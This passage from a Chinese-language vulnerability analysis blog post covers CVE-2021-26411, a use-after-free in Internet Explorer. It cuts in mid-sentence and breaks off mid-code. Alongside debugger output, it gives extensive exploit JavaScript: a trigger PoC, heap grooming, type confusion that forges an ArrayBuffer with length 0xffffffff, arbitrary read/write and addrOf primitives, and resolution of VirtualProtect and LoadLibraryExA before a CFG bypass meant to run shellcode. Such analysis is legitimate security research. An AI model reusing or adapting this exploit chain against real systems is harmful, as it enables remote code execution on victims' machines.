这个数组中存储了Attributre和nodevalue对象.</p><p>poc中所创建的obj应是索引1处的0x165780C4,为nodevalue1,索引3处为nodevalue2,value值的0x7b&#x3D;123.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121171411541.png" alt="image-20220121171411541"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121171856939.png" alt="image-20220121171856939"></p><p> CBase::FindAAIndexNS函数返回值为2,因为删除的元素是attr1,可知索引2处是attr1的对象.索引4为attr2的对象<img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121173218452.png" alt="image-20220121173218452"></p><p>然后程序再次调用该函数获取nodevalue对象索引,此时返回1.</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121173919588.png" alt="image-20220121173919588"></p><p>接着会调用函数CBase::GetInfoBSTRat传入node_value对象索引,获取node_value值,并转换为BSTR字符串.在这个函数中获取node_value的操作会触发valueof函数的回调,会调用重载后的函数,执行”element.ClearAttribute();”的操作</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126032131061.png" alt="image-20220126032131061"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126032656724.png" alt="image-20220126032656724"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126033149896.png" alt="image-20220126033149896"></p><p>而后执行函数删除CBase::DeleteAt删除索引2处attr对象</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126035642892.png" alt="image-20220126035642892"></p><p>当前CAttrArray布局,可以看到CAttrArray由于被清空,attr和node_value元素均已被最后一个对象覆盖.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126035713745.png" alt="image-20220126035713745"></p><p>而后再次执行函数CBase::FindAIndexNS获取node_value索引,此时由于CAttrArray被清空,已经获取不到了,此时返回-1,随后调用DeleteAt删除node_value,但是前面获取的node_value索引是-1</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126040100409.png" alt="image-20220126040100409"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126040243831.png" alt="image-20220126040243831"></p><p> 传入索引为-1时,会触发异常将CAttrArray置为null,在CAttrArray::Destroy函数获取成员变量时触发空指针异常.</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126040901034.png" alt="image-20220126040901034"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126041141701.png" alt="image-20220126041141701"></p><p>由于在ClearAttributes();函数执行时,CAttrArray数组中会通过最后一个对象进行覆盖操作,并且在后面第一次执行CBase::DeleteAt中会进行取值.所以可以通过创建BSTR字符串,赋值给最后一个nodevalue,在SysFreeString时进行触发释放重引用.</p><p>修改后poc如下:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> attr1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;b&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> attr2 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&quot;c&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> hd2;</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> obj = </span></span><span class="language-xquery">&#123;&#125;</span><span class="language-xml"><span class="language-javascript">;</span></span><br><span class="language-javascript"><span class="language-xml">    obj.<span class="hljs-property">valueOf</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">        <span class="hljs-type">element</span>.clearAttributes();</span><br><span class="language-xquery">        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;</span><br><span class="language-xquery">    &#125;</span><span class="language-xml"><span class="language-javascript">;</span></span><br><span class="language-javascript"><span class="language-xml">    attr1.<span class="hljs-property">nodeValue</span> = obj;</span></span><br><span class="language-javascript"><span class="language-xml">    element.<span class="hljs-title function_">setAttributeNode</span>(attr1);</span></span><br><span class="language-javascript"><span class="language-xml">    element.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x10000</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;A&#x27;</span>));</span></span><br><span class="language-javascript"><span class="language-xml">    element.<span class="hljs-title function_">removeAttributeNode</span>(attr1);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>当前Array</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201410452.png" alt="image-20220128201410452"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201443133.png" alt="image-20220128201443133"></p><p>执行完ClearAttributes后,CAttrArray被覆盖,并且node_value的BSTR字符串已经被释放.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201726688.png" alt="image-20220128201726688"></p><p> BSTR内存空间被释放</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201610014.png" alt="image-20220128201610014"></p><p>第一次DeleteAt时,nodevalue中BSTR字符串内存空间被释放重引用.所以该漏洞本质是一个UAF类型的漏洞.</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201944767.png" alt="image-20220128201944767"></p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p><strong>漏洞的利用方式是通过两个指针指向该nodevalue内存,进行类型混淆,通过读写这块内存构造出一个起始地址为0,长度为0xffffffff的ArrayBuffer,然后解析为DataView,实现任意地址的读写.</strong></p><p><strong>而后通过构造RPC_MESSAGE调用NdrServerCall进行任意系统函数的调用,覆盖rpcrt4.dll系统调用为KiFastSystemCalRetl关闭rpcrt4.dll的CFG保护,然后进行任意函数的跳转.执行shellcode.</strong></p><p>在第二次DeleteAt时,FindAAIndexNS返回索引为-1,而导致在函数中主动触发异常使CAttray被置空,所以需要绕过异常,可以在ClearAttributes后,再将attribute set回去,同时在ClearAttributes释放内存后,hd2.nodevalue使用大小为0x20010的dataview对象占用这块内存空间.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">att.<span class="hljs-property">nodeValue</span> = &#123;<br>           <span class="hljs-attr">valueOf</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>               hd1.<span class="hljs-property">nodeValue</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title function_">alloc1</span>()).<span class="hljs-property">nodeValue</span><br>               ele.<span class="hljs-title function_">clearAttributes</span>()<br>               <span class="hljs-comment">//重引用被释放的内存</span><br>               hd2 = hd1.<span class="hljs-title function_">cloneNode</span>()<br>               <span class="hljs-comment">//绕过异常</span><br>               ele.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;attribute&#x27;</span>, <span class="hljs-number">1337</span>)<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">alloc1</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(abf)<br>    <span class="hljs-keyword">var</span> str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">4</span>; i &lt; abf.<span class="hljs-property">byteLength</span> - <span class="hljs-number">2</span>; i += <span class="hljs-number">2</span>)<br>        str += <span class="hljs-string">&#x27;%u&#x27;</span> + <span class="hljs-title function_">pad0</span>(view.<span class="hljs-title function_">getUint16</span>(i, <span class="hljs-literal">true</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;alloc&#x27;</span>)<br>    result.<span class="hljs-property">nodeValue</span> = <span class="hljs-built_in">unescape</span>(str)<br>    <span class="hljs-keyword">return</span> result<br>&#125;<br><br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220204063836035.png" alt="image-20220204063836035"></p><p>然后在removeAttribute时进行二次释放,然后使用一个dict对象再次占用这块内存.这样做的目的是进行类型混淆,通过hd2.nodevalue读取和修改hd0.nodevalue内存.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">alloc2</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-comment">// 创建字典对象</span><br>           <span class="hljs-keyword">var</span> dic1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;Scripting.Dictionary&#x27;</span>)<br>           <span class="hljs-keyword">var</span> dic2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;Scripting.Dictionary&#x27;</span>)<br>           dic2.<span class="hljs-title function_">add</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>           dic1.<span class="hljs-title function_">add</span>(<span class="hljs-number">0</span>, dic2.<span class="hljs-title function_">items</span>())<br>           dic1.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, fake)<br>           dic1.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, arr)<br>           <span class="hljs-keyword">for</span> (i = <span class="hljs-number">3</span>; i &lt; <span class="hljs-number">0x20010</span> / <span class="hljs-number">0x10</span>; ++i)<br>               dic1.<span class="hljs-title function_">add</span>(i, <span class="hljs-number">0x12341234</span>)<br>           <span class="hljs-keyword">return</span> dic1.<span class="hljs-title function_">items</span>()<br>       &#125;<br> <span class="hljs-keyword">var</span> alloc = <span class="hljs-title function_">alloc2</span>()<br> <span class="hljs-comment">// 触发valueof函数回调</span><br> ele.<span class="hljs-title function_">removeAttributeNode</span>(att)<br> <span class="hljs-comment">//再次重引用removeAttributeNode后被释放的内存</span><br> hd0.<span class="hljs-property">nodeValue</span> = alloc<br> <span class="hljs-comment">//通过hd2.nodevalue读取重用后hd0.nodevalue内存</span><br> <span class="hljs-keyword">var</span> leak = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(<span class="hljs-title function_">dump</span>(hd2.<span class="hljs-property">nodeValue</span>))<br> <span class="hljs-comment">//fake</span><br> <span class="hljs-keyword">var</span> pAbf = leak[<span class="hljs-number">6</span>]<br> <span class="hljs-comment">//arr[]地址</span><br> <span class="hljs-keyword">var</span> pArr = leak[<span class="hljs-number">10</span>];<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>:<span class="hljs-number">023</span>:x86&gt; dd <span class="hljs-number">0c0b8890</span><br><span class="hljs-number">0c0b8890</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">098202b8</span> <span class="hljs-number">00000000</span> dict2.items()<span class="hljs-comment">;</span><br><span class="hljs-number">0c0b88a0</span>  <span class="hljs-number">00000009</span> <span class="hljs-number">00000000</span> <span class="hljs-number">09d</span>cdec<span class="hljs-number">4 00000000</span> fakeBuf ArrayBuffer(<span class="hljs-number">0</span>x100)<br><span class="hljs-number">0c0b88b0</span>  <span class="hljs-number">00000009</span> <span class="hljs-number">00000000</span> <span class="hljs-number">09d</span>cdf<span class="hljs-number">04 00000000</span> arr  [&#123;&#125;]<br><span class="hljs-number">0c0b88c0</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0c0b88d0</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0c0b88e0</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0c0b88f0</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0c0b8900</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br></code></pre></td></tr></table></figure><p>然后取出fakeBuf的地址,并刷新nodevalue的内存写入前40个字节地址.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">flush</span>(<span class="hljs-params"></span>) &#123;<br>            hd1.<span class="hljs-property">nodeValue</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title function_">alloc1</span>()).<span class="hljs-property">nodeValue</span><br>            hd2.<span class="hljs-property">nodeValue</span> = <span class="hljs-number">0</span><br>            hd2 = hd1.<span class="hljs-title function_">cloneNode</span>()<br>        &#125;<br><span class="hljs-keyword">var</span> <span class="hljs-variable constant_">VT_I4</span> = <span class="hljs-number">0x3</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable constant_">VT_DISPATCH</span> = <span class="hljs-number">0x9</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable constant_">VT_BYREF</span> = <span class="hljs-number">0x4000</span>;<br><span class="hljs-keyword">var</span> bufArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">var</span> fakeArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(fake);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>     <span class="hljs-title function_">setData</span>(i + <span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_BYREF</span> | <span class="hljs-variable constant_">VT_I4</span>, pAbf + i * <span class="hljs-number">4</span>));<br>&#125;<br><span class="hljs-title function_">flush</span>();<br> <br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219153033714.png" alt="image-20220219153033714"></p><p>再次将这些内存地址读取至bufArr[i]中,取出fakeBuf属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VBArray</span>(hd0.<span class="hljs-property">nodeValue</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>    bufArr[i] = ref.<span class="hljs-title function_">getItem</span>(i + <span class="hljs-number">1</span>);<br>&#125;<br>ref = <span class="hljs-literal">null</span>;<br><span class="hljs-title function_">setData</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_BYREF</span> | <span class="hljs-variable constant_">VT_I4</span>, bufArr[<span class="hljs-number">4</span>]));<br><span class="hljs-title function_">setData</span>(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_BYREF</span> | <span class="hljs-variable constant_">VT_I4</span>, bufArr[<span class="hljs-number">4</span>] + <span class="hljs-number">0x04</span>));<br><span class="hljs-title function_">setData</span>(<span class="hljs-number">3</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_BYREF</span> | <span class="hljs-variable constant_">VT_I4</span>, bufArr[<span class="hljs-number">4</span>] + <span class="hljs-number">0x1c</span>));<br><span class="hljs-title function_">flush</span>();<br></code></pre></td></tr></table></figure><p>Int32Array,ArrayBuffer内存结构参考,64位下有所差别</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Struct Int32Array     allocated at Custom Heap<br>&#123;<br>    void* pvftable<span class="hljs-comment">;</span><br>    DOWRD var_2<span class="hljs-comment">;</span><br>    DOWRD var_3<span class="hljs-comment">;</span><br>    DOWRD var_4<span class="hljs-comment">;</span><br>    DOWRD var_5<span class="hljs-comment">;</span><br>    DOWRD var_6<span class="hljs-comment">;</span><br>    DOWRD size<span class="hljs-comment">;            //条目的个数，字节数等于这项的值*4</span><br>    void* pTypeArrayData<span class="hljs-comment">;  //Arraybuffer Data</span><br>    void* pArrayBuffer<span class="hljs-comment">;   //Arraybuffer Object</span><br>    DWORD var_10<span class="hljs-comment">;</span><br>    DWORD var_11<span class="hljs-comment">;</span><br>    DWORD var_12<span class="hljs-comment">;</span><br>&#125;<br>Struct ArrayBuffer      allocated at Custom Heap<br>&#123;<br>    void* pvftable<span class="hljs-comment">;</span><br>    DOWRD var_2<span class="hljs-comment">;</span><br>    DOWRD var_3<span class="hljs-comment">;</span><br>    DOWRD var_4<span class="hljs-comment">;</span><br>    void* pTypeArrayData<span class="hljs-comment">;       //Arraybuffer Data</span><br>    DWORD size<span class="hljs-comment">;                 //array bytes</span><br>    DWORD var_10<span class="hljs-comment">;</span><br>    DWORD var_11<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里对ArrayBuffer做了封装,外层是JavaScriptDispatch对象</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219145717897.png" alt="image-20220219145717897"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219150105031.png" alt="image-20220219150105031"></p><p>ArrayBuffer_data由于前面通过下面这条代码进行初始化,所以其中存储的是Array对象.也是后面要进行伪造的ArrayBuffer对象</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> fake = <span class="hljs-keyword">new</span> <span class="hljs-type">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">var</span> fakeArr = <span class="hljs-keyword">new</span> <span class="hljs-type">Uint32Array</span>(fake);<br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219160035929.png" alt="image-20220219160035929"></p><p>刷新后,0f0 0f4 10c位置对应着fakebuf的属性</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219150207709.png" alt="image-20220219150207709"></p><p>然后通过前面申请的指向fakeBuf的fakeArray对象伪造出一份起始地址为0x0,长度为0xffffffff的ArrayBuffer对象,将bufArr中属性写入fakeArr,并将fake的ArrayBuf虚表指针地址fakeArr[4]位置,</p><p>将fake的一些属性进行替换,并将长度修改为0xffffffff,然后将构造好的ArrayBuffer写入node_value中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VBArray</span>(hd0.<span class="hljs-property">nodeValue</span>);<br>      <span class="hljs-keyword">var</span> vt = ref.<span class="hljs-title function_">getItem</span>(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">var</span> gc = ref.<span class="hljs-title function_">getItem</span>(<span class="hljs-number">2</span>);<br>      <span class="hljs-keyword">var</span> bs = ref.<span class="hljs-title function_">getItem</span>(<span class="hljs-number">3</span>);<br>      ref = <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i) &#123;<br>          fakeArr[i] = bufArr[i];<br>      &#125;<br>      fakeArr[<span class="hljs-number">4</span>] = bs + <span class="hljs-number">0x40</span>;<br>      fakeArr[<span class="hljs-number">16</span>] = vt;<br>      fakeArr[<span class="hljs-number">17</span>] = gc;<br>      fakeArr[<span class="hljs-number">24</span>] = <span class="hljs-number">0xffffffff</span>;<br>      <span class="hljs-title function_">setData</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_DISPATCH</span>, bs));<br>      <span class="hljs-title function_">flush</span>();<br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219162906665.png" alt="image-20220219162906665"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219162834343.png" alt="image-20220219162834343"></p><p>然后将这个ArrayBuffer解析为dataview对象,就可以实现任意地址读写.然后通过将对象存储至arr[{}],并读取pArr值,实现任意对象地址的读取.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrOf</span>(<span class="hljs-params">obj</span>) &#123;<br>           arr[<span class="hljs-number">0</span>] = obj<br>           <span class="hljs-keyword">return</span> <span class="hljs-title function_">read</span>(pArr, <span class="hljs-number">32</span>)<br>       &#125;<br><span class="hljs-title function_">write</span>(<span class="hljs-title function_">read</span>(<span class="hljs-title function_">addrOf</span>(hd0) + <span class="hljs-number">0x18</span>, <span class="hljs-number">32</span>) + <span class="hljs-number">0x28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p>通过任意地址读写泄露模块的基址,通过PE文件结构获取一些函数地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()<br><span class="hljs-keyword">var</span> jscript9 = <span class="hljs-title function_">getBase</span>(<span class="hljs-title function_">read</span>(<span class="hljs-title function_">addrOf</span>(map), <span class="hljs-number">32</span>))<br><span class="hljs-keyword">var</span> rpcrt4 = <span class="hljs-title function_">getDllBase</span>(jscript9, <span class="hljs-string">&#x27;rpcrt4.dll&#x27;</span>)<br><span class="hljs-keyword">var</span> msvcrt = <span class="hljs-title function_">getDllBase</span>(jscript9, <span class="hljs-string">&#x27;msvcrt.dll&#x27;</span>)<br><span class="hljs-keyword">var</span> ntdll = <span class="hljs-title function_">getDllBase</span>(msvcrt, <span class="hljs-string">&#x27;ntdll.dll&#x27;</span>)<br><span class="hljs-keyword">var</span> kernelbase = <span class="hljs-title function_">getDllBase</span>(msvcrt, <span class="hljs-string">&#x27;kernelbase.dll&#x27;</span>)<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">VirtualProtect</span> = <span class="hljs-title function_">getProcAddr</span>(kernelbase, <span class="hljs-string">&#x27;VirtualProtect&#x27;</span>)<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">LoadLibraryExA</span> = <span class="hljs-title function_">getProcAddr</span>(kernelbase, <span class="hljs-string">&#x27;LoadLibraryExA&#x27;</span>)<br></code></pre></td></tr></table></figure><p>而后创建了一个Attribute对象xyz,并覆盖其函数normalize(),修改为NdrServerCall2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> xyz = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;xyz&#x27;</span>)<br><span class="hljs-keyword">var</span> paoi = <span class="hljs-title function_">addrOf</span>(xyz)<br><span class="hljs-keyword">var</span> patt = <span 